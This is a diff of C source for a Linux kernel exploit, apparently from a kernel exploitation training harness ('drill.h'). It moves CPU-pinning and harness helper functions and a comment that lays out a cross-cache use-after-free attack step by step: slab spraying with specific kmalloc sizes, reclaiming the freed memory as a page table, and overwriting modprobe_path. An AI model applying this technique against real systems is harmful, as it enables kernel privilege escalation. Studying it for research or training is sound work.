@@ -30,6 +30,76 @@
 #include <linux/if_alg.h>
 #include "drill.h"
 
+#define STR_EXPAND(arg) #arg
+#define STR(arg) STR_EXPAND(arg)
+
+void do_cpu_pinning(void)
+{
+	int ret = 0;
+	cpu_set_t single_cpu;
+
+	CPU_ZERO(&single_cpu);
+	CPU_SET(0, &single_cpu);
+
+	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
+	if (ret != 0) {
+		perror("[-] sched_setaffinity");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("[+] pinned to CPU #0\n");
+}
+
+int act(int act_fd, int code, int n, char *args)
+{
+	char buf[DRILL_ACT_SIZE] = { 0 };
+	size_t len = 0;
+	ssize_t bytes = 0;
+
+	if (args)
+		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
+	else
+		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);
+
+	len = strlen(buf) + 1; /* with null byte */
+	assert(len <= DRILL_ACT_SIZE);
+
+	bytes = write(act_fd, buf, len);
+	if (bytes <= 0) {
+		perror("[-] write");
+		return EXIT_FAILURE;
+	}
+	if (bytes != len) {
+		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
+		return EXIT_FAILURE;
+	}
+
+	return EXIT_SUCCESS;
+}
+
+/*
+ * Cross-cache attack:
+ *  - collect the needed info:
+ *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
+ *        120
+ *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
+ *        42
+ *  - pin the process to a single CPU
+ *  - prepare the page table infrastructure
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - obtain dangling reference from use-after-free bug
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
+ *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
+ *  - create page table to reclaim the freed memory
+ *  - perform uaf write using the dangling reference
+ *  - change modprobe_path using the overwritten page table
+ */
+#define OBJS_PER_SLAB 42
+#define CPU_PARTIAL 120
+
 /*==== Pagetables stuff =====*/
 /* 
  * obtain MODPROBE_PATH_ADDR with `sudo cat /proc/kallsyms| grep modprobe_path`,
@@ -127,50 +197,6 @@ long read_file(const char *filename, void *buf, size_t buflen)
 	close(fd);
 
 	return retv;
-}
-
-void do_cpu_pinning(void)
-{
-	int ret = 0;
-	cpu_set_t single_cpu;
-
-	CPU_ZERO(&single_cpu);
-	CPU_SET(0, &single_cpu);
-
-	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
-	if (ret != 0) {
-		perror("[-] sched_setaffinity");
-		exit(EXIT_FAILURE);
-	}
-
-	printf("[+] pinned to CPU #0\n");
-}
-
-int act(int fd, int code, int n, char *args)
-{
-	char buf[DRILL_ACT_SIZE] = { 0 };
-	size_t len = 0;
-	ssize_t bytes = 0;
-
-	if (args)
-		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
-	else
-		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);
-
-	len = strlen(buf) + 1; /* with null byte */
-	assert(len <= DRILL_ACT_SIZE);
-
-	bytes = write(fd, buf, len);
-	if (bytes <= 0) {
-		perror("[-] write");
-		return EXIT_FAILURE;
-	}
-	if (bytes != len) {
-		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
-		return EXIT_FAILURE;
-	}
-
-	return EXIT_SUCCESS;
 }
 
 /* The exploit can work without it, but will be less reliable */
@@ -280,29 +306,6 @@ void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
 
 	return modprobe_addr;
 }
-
-/*
- * Cross-cache attack:
- *  - collect the needed info:
- *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
- *        120
- *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
- *        42
- *  - pin the process to a single CPU
- *  - prepare pagetables infrastructure
- *  - create new active slab, allocate objs_per_slab objects
- *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
- *  - create new active slab, allocate objs_per_slab objects
- *  - obtain dangling reference from use-after-free bug
- *  - create new active slab, allocate objs_per_slab objects
- *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
- *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - create pagetable to allocate freed memory
- *  - perform uaf write using the dangling reference
- *  - create an exploit fd and write its path as new modprobe path via the overwritten target object
- */
-#define OBJS_PER_SLAB 42
-#define CPU_PARTIAL 120
 
 int main(void)
 {
